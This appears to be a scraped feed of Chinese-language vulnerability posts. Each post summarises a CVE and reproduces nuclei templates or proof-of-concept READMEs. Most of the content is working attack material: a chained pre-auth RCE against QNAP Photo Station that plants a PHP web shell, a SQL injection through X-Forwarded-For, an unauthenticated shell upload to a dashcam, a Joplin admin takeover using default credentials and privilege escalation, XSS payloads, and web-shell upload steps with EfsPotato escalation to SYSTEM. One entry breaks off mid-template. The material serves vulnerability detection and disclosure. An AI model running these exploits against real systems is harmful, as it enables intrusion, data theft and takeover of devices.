posts.text: 漏洞信息漏洞名称： QNAP Photo Station 未授权远程代码执行漏洞 漏洞编号： CVE： CVE-2019-7194 漏洞类型： 未授权访问 漏洞等级： 严重 漏洞描述： QNAP Photo Station 6.0.3之前的版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经认证的远程代码执行（RCE）。这包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。为了减轻这些风险，QNAP强烈建议将Photo Station更新到最新可用版本。 产品厂商： QNAP 产品名称： QNAP Photo Station 影响版本： < 6.0.3 来源： https://github.com/projectdiscovery/nuclei-templates/blob/e55eed563ed52676a776d6a38b63eba9c5d08285/http%2Fcves%2F2019%2FCVE-2019-7194.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125id: qnap-photostation-CVE-2019-7194-preauth-rceinfo: name: QNAP Photo Station < 6.0.3 pre-auth RCE author: x-stp severity: critical description: | QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE). This includes a flaw involving external control of file names or paths, allowing attackers to access or modify sensitive system files. To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions. reference: - https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2019-7192,CVE-2019-7193,CVE-2019-7194,CVE-2019-7195 cwe-id: CWE-78 tags: cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,pocvariables: command_payload: '%3C%3F%3d%60%24_POST%5Bx%5D%60%3f%3e%40s.tp' dropper_command: "x= echo $((0x2C06*1337))" dropper_filename: "{{to_lower(rand_text_alpha(6))}}"http: - method: POST path: - "{{BaseURL}}/photo/p/api/album.php" headers: Content-Type: application/x-www-form-urlencoded body: "a=setSlideshow&f=qsamplealbum" extractors: - type: regex name: album_id group: 1 internal: true regex: - "<output>([a-zA-Z0-9]+)</output>" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album={{album_id}}" extractors: - type: regex name: access_code group: 1 internal: true regex: - "encodeURIComponent\\('([A-Za-z0-9%]+)'\\)" - type: regex part: header name: phpsessid group: 1 internal: true regex: - "PHPSESSID=([a-z0-9]+);" - method: POST path: - "{{BaseURL}}/photo/p/api/video.php" headers: Content-Type: application/x-www-form-urlencoded Cookie: "PHPSESSID={{phpsessid}}" body: "a=caption&f=UMGObv&album={{album_id}}&ac={{access_code}}&filename=../../../../../share/Multimedia/.@__thumb/ps.app.token" extractors: - type: regex name: app_token internal: true group: 1 regex: - "([a-f0-9]{32})" - method: POST path: - "{{BaseURL}}/cgi-bin/authLogin.cgi" headers: Content-Type: "application/x-www-form-urlencoded" body: "app=PHOTO_STATION&auth=1&app_token={{app_token}}" extractors: - type: regex part: body name: nas_sid internal: true group: 1 regex: - '<authSid><!\[CDATA\[([a-z0-9]+)\]\]></authSid>' - method: POST path: - "{{BaseURL}}/cgi-bin/userConfig.cgi?sid={{nas_sid}}" headers: Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Cookie: "DESKTOP=1; WINDOW_MODE=1; NAS_SID={{nas_sid}}; PHPSESSID={{phpsessid}}" body: "func=addPersonalSmtp&provider_idx=0&sender={{command_payload}}&default=0&smtp_server=0.0.0.0&port=25&security=-1&email_account=a%40b.com&email_passwd=ac1db1tch3z" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album=qsamplealbum" headers: Cookie: "QMS_SID=../../../../../../../../../../mnt/ext/opt/photostation2/{{dropper_filename}}.php; PHPSESSID={{phpsessid}}; NAS_SID={{nas_sid}}; DESKTOP=1; CACHE={{randstr}};" - method: POST path: - "{{BaseURL}}/photo/{{dropper_filename}}.php" headers: Content-Type: application/x-www-form-urlencoded # oh well.. use that cookie jar again here.. Cookie: "PHPSESSID={{phpsessid}}; NAS_SID={{nas_sid}}" body: "{{dropper_command}}" matchers-condition: and matchers: - type: status status: - 200 - type: word part: body words: - "NASVARS" - type: word part: body words: - "15067990" # magic.

posts.title: openSIS-Classic SQL注入漏洞
posts.text: 漏洞信息漏洞名称： openSIS-Classic SQL注入漏洞 漏洞编号： CVE： CVE-2024-46626 漏洞类型： SQL注入 漏洞等级： 高危 漏洞描述： openSIS-Classic 9.1版本中的Ajax.php文件存在通过X-Forwarded-For头的认证SQL注入漏洞，允许认证用户执行任意SQL查询。 产品厂商： OS4ED 产品名称： openSIS-Classic 影响版本： 9.1 来源： https://github.com/projectdiscovery/nuclei-templates/blob/8c034c27247f4b900decf6de2434b6ede15e193d/CVE-2024-46626.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526272829303132id: CVE-2024-46626info: name: openSIS-Classic 9.1 - Authenticated SQL Injection via X-Forwarded-For Header author: Haliteroglu severity: high description: > Authenticated SQL Injection vulnerability in openSIS-Classic 9.1 via the X-Forwarded-For header in Ajax.php. Allows execution of arbitrary SQL queries by authenticated users. reference: - https://nvd.nist.gov/vuln/detail/CVE-2024-46626 - https://github.com/OS4ED/openSIS-Classic tags: cve,cve2024,sqli,authenticated,opensisrequests: - method: GET path: - "{{BaseURL}}/Ajax.php?modname=x" headers: X-Forwarded-For: "127.0.0.2' AND SLEEP(5)-- -" Cookie: "{{cookie}}" matchers: - type: dsl dsl: - "duration>=5" condition: and extractors: - type: dsl dsl: - "duration"

posts.title: ISPConfig 代码注入漏洞
posts.text: 漏洞信息漏洞名称： ISPConfig 代码注入漏洞 漏洞编号： CVE： CVE-2023-46818 漏洞类型： 代码注入 漏洞等级： 高危 漏洞描述： 在ISPConfig 3.2.11p1之前版本中发现了一个问题。如果启用了admin_allow_langedit，管理员可以通过语言文件编辑器实现PHP代码注入。 产品厂商： ISPConfig 产品名称： ISPConfig 影响版本： version <= 3.2.11 来源： https://github.com/z7Akane/CVE-2023-46818 类型： CVE-2023:github search 仓库文件 .gitignore CVE-2023-46818.py README.md 来源概述 CVE-2023-46818 An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled. Usage1234❯ python3 CVE-2023-46818.pyUsage: python3 CVE-2023-46818.py <URL> <username> <password>Poc of CVE-2023-46818 ISPConfig <= 3.2.11 - Code Injection Vulnerability by z7Akane References https://nvd.nist.gov/vuln/detail/CVE-2023-46818 https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released https://seclists.org/fulldisclosure/2023/Dec/2 CreditIf you found this project useful or interesting, consider supporting it by giving a ⭐ to the repository!

posts.title: Apache HTTP Server SSL/TLS证书验证绕过漏洞
posts.text: 漏洞信息漏洞名称： Apache HTTP Server SSL/TLS证书验证绕过漏洞 漏洞编号： CVE： CVE-2024-40898 漏洞类型： 配置问题 漏洞等级： 严重 漏洞描述： Apache HTTP Server中存在一个严重的SSL/TLS证书验证绕过漏洞（CVE-2024-40898），在某些错误配置下可能允许绕过SSL/TLS证书验证。该漏洞通过向目标服务器发起SSL连接并发送HEAD请求来检测。如果响应表明SSL证书验证处理不当，则服务器可能易受攻击。 产品厂商： Apache 产品名称： Apache HTTP Server 来源： https://github.com/anilpatel199n/CVE-2024-40898 类型： CVE-2024:github search 仓库文件 CVE-2024-40898 .py README.md 来源概述CVE-2024-40898This Python script checks for the presence of CVE-2024-40898, a critical vulnerability in Apache HTTP Server that may allow SSL/TLS certificate verification bypass under certain misconfigurations. It initiates an SSL connection to the target server and sends a HEAD request. It initiates an SSL connection to the target server and sends a HEAD request. If the response suggests that SSL certificate verification is improperly handled, the server might be vulnerable. 🚀 Features✅ Supports full URLs or plain IPs with optional ports ✅ Automatically parses and defaults to port 443 if not specified ✅ Ignores SSL certificate errors (for test purposes) ✅ Minimal and fast detection logic ✅ Clear output indicating possible vulnerability 🛠 Usagepython CVE-2024-40898.py -u https://192.168.1.1:443You can also just pass an IP: python CVE-2024-40898.py -u 192.168.1.1⚠️ DisclaimerThis script is for educational and authorized security testing only. Do not use on systems you do not own or have explicit permission to test.

posts.title: The Image Resizer On The Fly plugin for WordPress is vulnerable to arbitrary file deletion due to
posts.text: 链接： https://github.com/advisories/GHSA-gxqj-2gvr-3p2f CVSS 评分： 9.1 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2025-6065 https://plugins.trac.wordpress.org/browser/image-resizer-on-the-fly/trunk/image-resizer-on-the-fly.php#L25 https://wordpress.org/plugins/image-resizer-on-the-fly https://www.wordfence.com/threat-intel/vulnerabilities/id/14877ff6-e393-41a3-91c1-fe7f477297cc?source=cve https://github.com/advisories/GHSA-gxqj-2gvr-3p2f 描述： The Image Resizer On The Fly plugin for WordPress is vulnerable to arbitrary file deletion due to insufficient file path validation in the ‘delete’ task in all versions up to, and including, 1.1. This makes it possible for unauthenticated attackers to delete arbitrary files on the server, which can easily lead to remote code execution when the right file is deleted (such as wp-config.php).

posts.title: Online Appointment Booking System Reflected XSS Vulnerability
posts.text: 漏洞信息漏洞名称： Online Appointment Booking System Reflected XSS Vulnerability 漏洞编号： CVE： CVE-2025-46181 漏洞类型： 跨站可执行脚本 漏洞等级： 中危 漏洞描述： 在线预约预订系统(v1.0)中存在反射型跨站脚本(XSS)漏洞，特别是在处理预约确认的页面中。一个GET参数未能正确清理输入，使得可以在受害者的浏览器中注入并执行JavaScript代码。 产品名称： Online Appointment Booking System 影响版本： v1.0 来源： https://github.com/shemkumar/CVE-2025-46181-XSS 类型： CVE-2025:github search 仓库文件 DISCLAIMER.md LICENSE README.md poc.py 来源概述CVE-2025-46181 - Reflected XSS in an Online Appointment Booking SystemCVE-ID: CVE-2025-46181Discovered by: Shemkumar P (shemkumar.github.io)Vulnerability Type: Reflected Cross-Site Scripting (XSS)Severity: MediumStatus: Disclosed, CVE Assigned by MITRE ✨ DescriptionA Reflected Cross-Site Scripting (XSS) vulnerability exists in a public online appointment booking system (v1.0), specifically in the page that handles appointment confirmation. A GET parameter fails to sanitize input properly, enabling JavaScript injection and code execution in the victim’s browser. 📍 Vulnerable Parameter1GET /confirmapp.php?slotdt=<payload> Example Payload (Encoded): 1<script>alert("XSS")</script> 💥 Proof of Concept (PoC)1<script>alert("You have been hijacked")</script> 🚫 Live link redacted for ethical reasons. This vulnerability was tested in a controlled environment. ⚙️ Python PoC Script123456789101112131415161718import requestsfrom urllib.parse import quotebase_url = "https://[REDACTED]/confirmapp.php"payload = '<script>alert("XSS triggered")</script>'params = { 'fullname': 'test', 'mobile': '9999999999', 'emailid': 'test@example.com', 'slotdt': payload, 'slottime': '11:00:00', 'doctorid': '2'}encoded = '&'.join(f"{k}={quote(str(v))}" for k, v in params.items())print("Test URL (use only in authorized test environments):")print(f"{base_url}?{encoded}") 🛡️ Impact Arbitrary JavaScript execution Potential session hijacking Clickjacking or phishing redirection Targeted attacks through crafted links 🧪 RemediationThe application should: Escape user inputs using htmlspecialchars() in PHP Use a Content Security Policy (CSP) Sanitize user data at both client and server sides 📜 Timeline Discovered: May 2025 CVE Assigned by MITRE: June 2025 Public Release: June 2025 🧑‍💻 AuthorShemkumar P🕸️ shemkumar.github.io🔐 Cybersecurity Researcher | CTF Enthusiast | CVE Reporter ⚠️ This publication is for educational and defensive use only. Testing or exploiting vulnerabilities on systems you don’t own or have explicit permission for is illegal and unethical.

posts.title: IROAD FX2 Dashcam 未授权文件上传漏洞
posts.text: 漏洞信息漏洞名称： IROAD FX2 Dashcam 未授权文件上传漏洞 漏洞编号： CVE： CVE-2025-2350 漏洞类型： 文件上传 漏洞等级： 高危 漏洞描述： IROAD FX2行车记录仪在/action/upload_file处暴露了一个未授权的文件上传端点，允许攻击者上传任意文件到行车记录仪的存储中。 产品厂商： IROAD 产品名称： IROAD FX2 Dashcam 来源： https://github.com/projectdiscovery/nuclei-templates/blob/84677b71bee6be39e601b5c2036ee462281b5f7c/http%2Fcves%2F2025%2Fcve-2025-2350.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637id: cve-2025-2350info: name: IROAD FX2 Dashcam Unauthenticated File Upload author: ProjectDiscoveryAI severity: high description: | The IROAD FX2 dashcam exposes an unauthenticated file upload endpoint at /action/upload_file, allowing an attacker to upload arbitrary files to the dashcam’s storage. tags: cve,file-uploadhttp: - raw: - | POST /action/upload_file HTTP/1.1 Host: {{Hostname}} Content-Type: multipart/form-data; boundary=------------------------d57e4b98d42a76a3 --------------------------d57e4b98d42a76a3 Content-Disposition: form-data; name="file"; filename="test.cgi" Content-Type: application/octet-stream #!/bin/sh echo "Content-type: text/plain\n\n" echo "Webshell Access Successful" --------------------------d57e4b98d42a76a3-- matchers-condition: and matchers: - type: status status: - 200 - 201 - type: word words: - "File uploaded successfully" part: body

posts.text: 漏洞信息漏洞名称： Joplin 默认凭证漏洞 漏洞类型： 弱口令 漏洞等级： 高危 漏洞描述： Joplin Server安装存在默认管理凭证漏洞。系统默认使用admin@localhost:admin作为管理员账户凭证。攻击者可以利用这些默认凭证获取Joplin Server实例的管理员访问权限，可能危及敏感用户数据和系统功能。 产品厂商： Joplin 产品名称： Joplin Server 搜索语法： title:”Joplin Server” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/1471996485f9a40dac7dc8dea7a29601cc4420fa/http%2Fdefault-logins%2Fjoplin-default-login.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142id: joplin-default-logininfo: name: Joplin - Default Credentials author: pussycat0x severity: high description: | Joplin Server installations are vulnerable to default administrative credentials. The system ships with a default admin account using the credentials admin@localhost:admin. Attackers can leverage these default credentials to gain administrative access to the Joplin Server instance, potentially compromising sensitive user data and system functionality. metadata: verified: true shodan-query: 'title:"Joplin Server"' tags: joplin,oss,default-loginhttp: - raw: - | POST /api/sessions HTTP/1.1 Host: {{Hostname}} Content-Type: application/json { "email": "{{email}}", "password": "{{password}}" } payloads: email: - admin@localhost password: - admin attack: clusterbomb matchers: - type: dsl dsl: - 'status_code == 200' - 'contains(body,"user_id") && contains(body,"id")' condition: and

posts.text: 漏洞信息漏洞名称： PAN-OS 反射型跨站脚本漏洞 漏洞编号： CVE： CVE-2025-0133 漏洞类型： 跨站可执行脚本 漏洞等级： 中危 漏洞描述： Palo Alto Networks PAN-OS®软件中的GlobalProtect™网关和门户功能存在反射型跨站脚本（XSS）漏洞，当认证的Captive Portal用户点击特制链接时，可以在其浏览器上下文中执行恶意JavaScript。主要风险是可能导致凭证盗窃的钓鱼攻击，特别是如果启用了Clientless VPN。 产品厂商： Palo Alto Networks 产品名称： PAN-OS 搜索语法： http.favicon.hash:”-631559155” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/34e526943bc7ac792034d2c306f1e35bda9a2acc/http%2Fcves%2F2025%2FCVE-2025-0133.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637id: CVE-2025-0133info: name: PAN-OS - posts.title: Joplin 3.3.3 Server - Privilege Escalation
posts.text: 漏洞信息漏洞名称： Joplin 3.3.3 Server - Privilege Escalation 漏洞编号： CVE： CVE-2025-27134 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： Joplin Server 3.3.3之前的版本存在权限提升漏洞，非管理员用户可以利用PATCH /api/users/:id端点将is_admin设置为1，从而获得管理员权限。此问题已在3.3.3版本中修复。 产品厂商： Joplin 产品名称： Joplin Server 影响版本： version < 3.3.3 搜索语法： title:”Joplin Server” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/aa0e90c921a00a1f5f5797fa2c27acb11dd9171f/http%2Fcves%2F2025%2FCVE-2025-27134.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485id: CVE-2025-27134info: name: Joplin 3.3.3 Server - Privilege Escalation author: zonia3000 severity: high description: | A privilege escalation vulnerability in Joplin Server before version 3.3.3 allows non-admin users to exploit the PATCH /api/users/:id endpoint to set is_admin to 1. This enables unauthorized users to gain admin access. The issue is fixed in version 3.3.3. reference: - https://github.com/laurent22/joplin/security/advisories/GHSA-xj67-649m-3p8x - https://nvd.nist.gov/vuln/detail/CVE-2025-27134 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H cvss-score: 8.8 cve-id: CVE-2025-27134 cwe-id: CWE-284 metadata: verified: true shodan-query: 'title:"Joplin Server"' tags: cve,cve2025,auth,joplin,oss,default-loginhttp: - raw: - | POST /api/sessions HTTP/1.1 Host: {{Hostname}} Content-Type: application/json { "email": "{{email}}", "password": "{{password}}" } - | PATCH /api/users/{{user_id}} HTTP/1.1 Host: {{Hostname}} Cookie: sessionId={{session_id}} Content-Type: application/json { "is_admin": 1 } - | GET /api/users HTTP/1.1 Host: {{Hostname}} Cookie: sessionId={{session_id}} Content-Type: application/json payloads: email: - admin@localhost password: - admin attack: clusterbomb matchers: - type: dsl dsl: - 'status_code == 200' - 'contains(body_1,"user_id") && contains(body_1,"id")' - contains(user, "{{user_id}}") condition: and extractors: - type: json part: body_1 name: user_id json: - '.user_id' internal: true - type: json part: body_1 name: session_id json: - '.id' internal: true - type: json name: user part: body_3 json: - '.items[] | select(.is_admin == 1) | .id'

posts.title: Timetrax V1 (2025) 远程代码执行和权限提升漏洞
posts.text: 漏洞信息漏洞名称： Timetrax V1 (2025) 远程代码执行和权限提升漏洞 漏洞编号： CVE： CVE-2025-46157 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： 在Timetrax V1 (2025)中发现了一个严重漏洞，允许认证用户绕过文件上传限制并实现远程代码执行(RCE)。问题存在于考勤模块的请假请求表单中，服务器端验证薄弱，允许通过修改请求上传恶意的.asp web shell。进一步的利用允许通过滥用SeImpersonatePrivilege使用EfsPotato技术提升权限至SYSTEM。 产品厂商： Timetrax 产品名称： Timetrax V1 影响版本： 2025 来源： https://github.com/morphine009/CVE-2025-46157 类型： CVE-2025:github search 仓库文件 README.md 来源概述CVE-2025-46157CVE-2025-46157 – Timetrax V1 (2025) Remote Code Execution and Privilege EscalationSummaryA critical vulnerability was discovered in Timetrax V1 (2025) that allows authenticated users to bypass file upload restrictions and achieve remote code execution (RCE). The issue exists in the Leave Request form of the Attendance module, where weak server-side validation permits the upload of malicious .asp web shells via modified requests. Further exploitation allows privilege escalation to SYSTEM using the EfsPotato technique by abusing the SeImpersonatePrivilege. Vulnerability Details✅ Remote Code Execution (RCE) Component: Leave Request form in Attendance module Cause: Insecure server-side file validation Attack Vector: Modify upload request to change .txt to .asp Impact: Full command execution on the server ✅ Privilege Escalation Technique: EfsPotato Privilege Misuse: SeImpersonatePrivilege Result: SYSTEM-level access AV Evasion: Achieved using obfuscated payloads CVSS v3.1 ScoreBase Score: 9.9 (Critical)Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H Proof of Concept (PoC)1. Remote Code Execution Login to Timetrax with valid user credentials. Go to the Leave Request form under the Attendance module. Upload a .txt file, intercept the HTTP request using Burp Suite. Modify the file extension in the request from .txt to .asp. Forward the request. The server will return a URL to the uploaded file. Visit the URL to trigger the malicious web shell. 2. Privilege Escalation Use the EfsPotato exploit to abuse SeImpersonatePrivilege. Obfuscate the binary or payload to bypass AV detection. Gain SYSTEM-level shell and create a new Administrator account as proof. Affected Version Timetrax V1 (2025) Mitigation Enforce strong password policies and enable MFA Properly validate and sanitize uploaded files on the server Restrict SeImpersonatePrivilege to required accounts only Apply OS patches to mitigate EfsPotato Disable EFS if not required Disclosure Discovered by: Noman Azam Email: noman@technobiz.com.pk CVE ID: CVE-2025-46157 (Reserved) References EfsPotato Exploit This repository is part of responsible disclosure and educational purposes only. Always follow ethical guidelines and coordinated disclosure policies.
